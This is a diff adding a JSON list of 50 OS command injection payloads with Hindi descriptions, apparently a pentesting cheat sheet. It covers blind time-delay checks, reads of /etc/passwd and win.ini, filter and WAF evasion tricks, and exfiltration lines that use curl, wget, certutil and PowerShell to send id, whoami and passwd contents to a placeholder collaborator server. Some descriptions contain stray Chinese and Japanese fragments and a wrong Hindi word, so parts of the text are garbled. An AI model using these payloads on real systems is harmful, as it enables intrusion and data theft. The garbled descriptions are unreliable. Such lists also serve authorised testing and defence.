@@ -1,0 +1,302 @@
+[
+  {
+    "id": 1,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "; sleep 10 --",
+    "description": "यह पेलोड लिनक्स (Linux) सर्वर को 10 सेकंड के लिए रोक देता है। इससे बिना आउटपुट देखे भी कमजोरी का पता लगाया जा सकता है।"
+  },
+  {
+    "id": 2,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "& ping -c 10 127.0.0.1 &",
+    "description": "यह लिनक्स सर्वर को खुद को ही 10 बार पिंग करने के लिए मजबूर करता है, जिससे रिस्पॉन्स टाइम में देरी (Delay) दिखाई देती है।"
+  },
+  {
+    "id": 3,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "| ping -n 10 127.0.0.1 |",
+    "description": "विंडोज (Windows) सर्वर के लिए समय की देरी पैदा करने वाला पेलोड, जहाँ '-n' का उपयोग पैकेट काउंट बदलने के लिए होता है।"
+  },
+  {
+    "id": 4,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "; nslookup YOUR_COLLABORATOR_SERVER.com ;",
+    "description": "यह आपके नियंत्रित बाहरी सर्वर पर एक DNS लुकअप भेजता है, जिससे यह कन्फर्म होता है कि सर्वर बाहरी कमांड चला पा रहा है।"
+  },
+  {
+    "id": 5,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "|| curl http://YOUR_COLLABORATOR_SERVER.com ||",
+    "description": "यदि मुख्य कमांड फेल हो जाती है, तो यह पेलोड आपके लिसनर (Listener) सर्वर पर एक HTTP रिक्वेस्ट भेजकर कमजोरी की पुष्टि करता है।"
+  },
+  {
+    "id": 6,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "$(wget http://YOUR_COLLABORATOR_SERVER.com)",
+    "description": "एक इनलाइन वेब-रिक्वेस्ट कमांड, जो सर्वर से बाहरी कनेक्शन स्थापित करके ब्लाइंड इंजेक्शन की जांच करती है।"
+  },
+  {
+    "id": 7,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "; certutil -urlcache -f http://YOUR_COLLABORATOR_SERVER.com test.txt",
+    "description": "विंडोज के डिफॉल्ट टूल (Certutil) का उपयोग करके बाहरी फाइल डाउनलोड करने की कोशिश करता है, जिससे ब्लाइंड इंजेक्शन वेरिफाई होता है।"
+  },
+  {
+    "id": 8,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "; powershell Invoke-WebRequest -Uri http://YOUR_COLLABORATOR_SERVER.com",
+    "description": "विंडोज पॉवरशेल (PowerShell) का इस्तेमाल करके आपके सर्वर पर एक वेब रिक्वेस्ट भेजता है।"
+  },
+  {
+    "id": 9,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "%0A sleep 5 %0A",
+    "description": "यूआरएल-एन्कोडेड (URL-encoded) न्यूलाइन कैरेक्टर का उपयोग करके कमांड को अलग करता है, जिससे सख्त सुरक्षा फिल्टर बायपास होते हैं।"
+  },
+  {
+    "id": 10,
+    "category": "Out-of-Band & Blind Verification",
+    "payload": "`ping -c 5 $(whoami).YOUR_COLLABORATOR_SERVER.com`",
+    "description": "डेटा चोरी (Exfiltration) की तकनीक, जो सर्वर के करंट यूजर का नाम निकालकर उसे DNS क्वेरी के रूप में आपके सर्वर पर भेजती है।"
+  },
+  {
+    "id": 11,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "; id ;",
+    "description": "लिनक्स सर्वर पर放 करंट यूजर की ID, ग्रुप मैपिंग और प्रिविलेज स्कोप की पूरी जानकारी स्क्रीन पर प्रिंट करता है।"
+  },
+  {
+    "id": 12,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "& whoami &",
+    "description": "यह कमांड लिनक्स और विंडोज दोनों प्लेटफॉर्म पर वर्तमान में चल रहे एक्टिव अकाउंट का नाम वापस स्क्रीन पर दिखाती है।"
+  },
+  {
+    "id": 13,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "| uname -a |",
+    "description": "यूनिक्स/लिनक्स सिस्टम पर चलने वाले हार्डवेयर, कर्नेल वर्जन और ऑपरेटिंग सिस्टम के रिलीज की पूरी जानकारी देता है।"
+  },
+  {
+    "id": 14,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "&& ver &&",
+    "description": "विंडोज स्पेसिफिक कमांड, जो स्क्रीन पर विंडोज ऑपरेटिंग सिस्टम का सटीक वर्जन और बच्चन नंबर प्रिंट करती है।"
+  },
+  {
+    "id": 15,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "; cat /etc/passwd",
+    "description": "लिनक्स सिस्टम पर मौजूद सभी यूज़र्स की लिस्ट और उनकी कॉन्फ़िगरेशन डायरेक्टरी वाली संवेदनशील फाइल को पढ़ता है।"
+  },
+  {
+    "id": 16,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "| type C:\\Windows\\win.ini",
+    "description": "विंडोज की बुनियादी सिस्टम कॉन्फ़िगरेशन फाइल (win.ini) को पढ़कर यह जांचता है कि फाइल रीड करने की अनुमति है या नहीं।"
+  },
+  {
+    "id": 17,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "; ls -la /var/www/html/",
+    "description": "वेब रूट डायरेक्टरी के अंदर की सभी फाइलों और फोल्डर्स को उनकी अनुमतियों (Permissions) के साथ लिस्ट करता है।"
+  },
+  {
+    "id": 18,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "; dir C:\\",
+    "description": "विंडोज सिस्टम की मुख्य सी-ड्राइव (C:\\) के अंदर मौजूद सभी फाइलों और डायरेक्टरी का इंडेक्स स्क्रीन पर दिखाता है।"
+  },
+  {
+    "id": 19,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "; ifconfig",
+    "description": "लिनक्स सर्वर के लोकल नेटवर्क एडेप्टर, इंटरनल आईपी एड्रेस (IP) और राउटिंग कॉन्फ़िगरेशन को उजागर करता है।"
+  },
+  {
+    "id": 20,
+    "category": "Classic Inline Data Retrieval",
+    "payload": "| ipconfig /all",
+    "description": "विंडोज आर्किटेक्चर के अंदर मौजूद सभी नेटवर्क एडेप्टर और उनकी पूरी नेटवर्क सेटिंग्स की जानकारी निकालता है।"
+  },
+  {
+    "id": 21,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "cat$IFS/etc/passwd",
+    "description": "लिनक्स में स्पेस (Space) को इंटरनल फील्ड सेपरेटर ($IFS) से बदल देता है, जिससे स्पेस ब्लॉक करने वाले फिल्टर बायपास होते हैं।"
+  },
+  {
+    "id": 22,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": ";{cat,/etc/passwd}",
+    "description": "ब्रेक एक्सपेंशनパターン का उपयोग करता है, जिससे बिना किसी व्हाइटस्पेस (Space) का उपयोग किए कमांड एग्जीक्यूट हो जाती है।"
+  },
+  {
+    "id": 23,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "w'h'o'a'm'i",
+    "description": "सिग्नेचर चेकिंग को धोखा देने के लिए सिंगल कोट्स (') जोड़ता है। शेल (Shell) इसे चलाने से पहले कोट्स को हटा देता है।"
+  },
+  {
+    "id": 24,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "w\"h\"o\"a\"m\"i",
+    "description": "डबल कोट्स (\") का उपयोग करके स्ट्रिंग स्कैनर्स को चकमा देता है, जबकि मुख्य कमांड का आउटपुट सामान्य ही रहता है।"
+  },
+  {
+    "id": 25,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "echo%20Y2F0IC9ldGMvcGFzc3dk%20|%20base64%20-d%20|%20sh",
+    "description": "यह पेलोड 'cat /etc/passwd' को Base64 में बदलकर भेजता है और सर्वर पर डिकोड करके सीधे शेल में पाइप कर देता है।"
+  },
+  {
+    "id": 26,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "c\\a\\t\\ /\\e\\t\\c/\\p\\a\\s\\s\\w\\d",
+    "description": "लिनक्स सर्वर पर स्टेटिक टेक्स्ट पैटर्न मैचर्स को तोड़ने के लिए बैकस्लैश (\\) कैरेक्टर एस्केप मास्क का उपयोग करता है।"
+  },
+  {
+    "id": 27,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "; user_cmd=id; $user_cmd",
+    "description": "एक कस्टमाइज़्ड वेरिएबल घोषित करता है ताकि सुरक्षा प्रणालियों (WAF) से मूल कमांड का असली मकसद छुपाया जा सके।"
+  },
+  {
+    "id": 28,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "cmd.exe /c \"set x=who& set y=ami& call %x%%y%\"",
+    "description": "विंडोज सर्वर पर ब्लॉक किए गए शब्दों को वेरिएबल के टुकड़ों में बांटकर रन-टाइम पर एक साथ जोड़कर निष्पादित करता है।"
+  },
+  {
+    "id": 29,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "; cat /etc/pas's'wd",
+    "description": "फाइल पाथ के बीच में कोट्स लगाकर सख्त पाथ सिग्नेचर ब्लैकलिस्ट और फ़ायरवॉल को बायपास करता है।"
+  },
+  {
+    "id": 30,
+    "category": "Filter Evasion & Obfuscation",
+    "payload": "; head -n 1 /etc/passwd",
+    "description": "यदि 'cat' या 'less' जैसे शब्द ब्लॉक हैं, तो यह फाइल पढ़ने के लिए एक वैकल्पिक टूल (head) का उपयोग करता है।"
+  },
+  {
+    "id": 31,
+    "category": "Advanced Filter Evasion",
+    "payload": "cat</etc/passwd",
+    "description": "लिनक्स में बिना स्पेस के फ़ाइल रीड करने के लिए इनपुट रीडायरेक्शन (<) का इस्तेमाल करता है।"
+  },
+  {
+    "id": 32,
+    "category": "Advanced Filter Evasion",
+    "payload": "X=$'c\\x61\\x74';$X$IFS/etc/passwd",
+    "description": "Hexadecimal फॉर्मेट का उपयोग करके 'cat' कमांड को फ़ायरवॉल की नज़रों से पूरी तरह छुपा देता है।"
+  },
+  {
+    "id": 33,
+    "category": "Advanced Filter Evasion",
+    "payload": "sh<<<\"$(echo -e '\\x69\\x64')\"",
+    "description": "कमांड स्ट्रिंग को 'sh' इंटरप्रेटर के अंदर Here-String (<<<) आर्किटेक्चर के माध्यम से पुश करता है।"
+  },
+  {
+    "id": 34,
+    "category": "Advanced Filter Evasion",
+    "payload": "; echo '/etc/passwd' | rev",
+    "description": "'rev' कमांड का उपयोग करके उलटे लिखे गए पेलोड को सर्वर पर सीधा करके रन करने की तरकीब।"
+  },
+  {
+    "id": 35,
+    "category": "Advanced Filter Evasion",
+    "payload": ";awk '{print}' /etc/passwd",
+    "description": "अगर 'cat' पूरी तरह ब्लॉक हो, तो संवेदनशील फाइलों को पढ़ने के लिए 'awk' यूटिलिटी का उपयोग।"
+  },
+  {
+    "id": 36,
+    "category": "Advanced Filter Evasion",
+    "payload": ";grep -E '.*' /etc/passwd",
+    "description": "ग्लोबल रेगुलर एक्सप्रेशन प्रिंटर ('grep') का उपयोग करके किसी फाइल के पूरे कंटेंट को रीड करना।"
+  },
+  {
+    "id": 37,
+    "category": "Advanced Filter Evasion",
+    "payload": "ping$IFS-c$IFS'1'$IFS'localhost'",
+    "description": "कमांड एर्ग्युमेंट्स के बीच में解除 सिंगल कोट्स और IFS का मिक्सचर बनाकर फ़ायरवॉल डिटैक्शन को फेल करना।"
+  },
+  {
+    "id": 38,
+    "category": "Windows Specific Logic",
+    "payload": "%CD:~0,1%",
+    "description": "विंडोज एनवायरनमेंट वेरिएबल से 'C' अक्षर को निकालकर कमांड पाथ को डायनामिक बनाने की तकनीक।"
+  },
+  {
+    "id": 39,
+    "category": "Windows Specific Logic",
+    "payload": "cmd /c \"echo %PATH%\"",
+    "description": "विंडोज सिस्टम के पूरे एनवायरनमेंट पाथ को लीक करने के लिए इस्तेमाल की जाने वाली कमांड।"
+  },
+  {
+    "id": 40,
+    "category": "Windows Specific Logic",
+    "payload": "type$IFS%WINDIR%\\win.ini",
+    "description": "विंडोज के डिफ़ॉल्ट एनवायरनमेंट वेरिएबल (%WINDIR%) का उपयोग करके सिस्टम फ़ाइलों को टारगेट करना।"
+  },
+  {
+    "id": 41,
+    "category": "Data Exfiltration Techniques",
+    "payload": "; curl http://YOUR_COLLABORATOR_SERVER.com/$(whoami)",
+    "description": "सर्वर के करंट यूजर का नाम निकालकर उसे HTTP GET पैरामीटर के रूप में सीधे आपके सर्वर पर भेजता है।"
+  },
+  {
+    "id": 42,
+    "category": "Data Exfiltration Techniques",
+    "payload": "; cat /etc/passwd | xargs -I {} curl -X POST -d {} http://YOUR_COLLABORATOR_SERVER.com",
+    "description": "पूरी passwd फ़ाइल की एक-एक लाइन को POST डेटा बनाकर आपके रिमोट कोलाबोरेटर सर्वर पर एक्सफ़िलिट्रेट करता है।"
+  },
+  {
+    "id": 43,
+    "category": "Data Exfiltration Techniques",
+    "payload": "; wget --post-data=$(id) http://YOUR_COLLABORATOR_SERVER.com",
+    "description": "'wget' यूटिलिटी का उपयोग करके 'id' कमांड के आउटपुट को पोस्ट डेटा के रूप में बाहर भेजता है।"
+  },
+  {
+    "id": 44,
+    "category": "Wildcard Exploitation",
+    "payload": "; /bin/c?t /etc/pa??wd",
+    "description": "कमांड और फ़ाइल नेम दोनों में वाइल्डकार्ड कैरेक्टर (?) का उपयोग करता है ताकि कोई भी स्टेटिक सिग्नेचर इसे पकड़ न पाए।"
+  },
+  {
+    "id": 45,
+    "category": "Wildcard Exploitation",
+    "payload": "; /usr/bin/w??ami",
+    "description": "'whoami' कमांड को बिना उसका पूरा नाम लिखे सिस्टम वाइल्डकार्ड की मदद से एग्जीक्यूट करने का तरीका।"
+  },
+  {
+    "id": 46,
+    "category": "Inline Execution Shortcuts",
+    "payload": "echo `id`",
+    "description": "ओल्ड-स्कूल बैकथिक्स (``) का उपयोग करके किसी भी इनलाइन क्वेरी को पैरेंट कमांड के अंदर ही प्रोसेस कराने की ट्रिक।"
+  },
+  {
+    "id": 47,
+    "category": "Inline Execution Shortcuts",
+    "payload": "; exec id",
+    "description": "वर्तमान शेल प्रोसेस को सीधे 'id' कमांड की प्रोसेस से बदल देता है, जिससे लॉग्स में ट्रेसेबिलिटी कम हो जाती है।"
+  },
+  {
+    "id": 48,
+    "category": "Bypass via Slash Alternates",
+    "payload": "; echo -e '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | xargs cat",
+    "description": "अगर फॉरवर्ड स्लैश (/) इनपुट में ब्लॉक है, तो स्लैश को हेक्स कोड (\\x2f) में बदलकर पाथ पास करने का एडवांस तरीका।"
+  },
+  {
+    "id": 49,
+    "category": "WAF Stress Evasion",
+    "payload": ";;;;;;;;;;;;;;;;;; id",
+    "description": "लगातार कई सारे सेमीकोलन (;) भेजकर कुछ कमज़ोर पार्सर्स को ओवरफ़्लो या कंफ्यूज करके कमांड रन करना।"
+  },
+  {
+    "id": 50,
+    "category": "WAF Stress Evasion",
+    "payload": "\n\n\n\nwhoami\n\n\n\n",
+    "description": "कमांड स्ट्रिंग के आगे और पीछे मल्टीपल न्यूलाइन बफ़र्स डालकर फ़ायरवॉल के ट्रिमिंग और क्लीनिंग फ़िल्टर्स को बायपास करना।"
+  }
+]
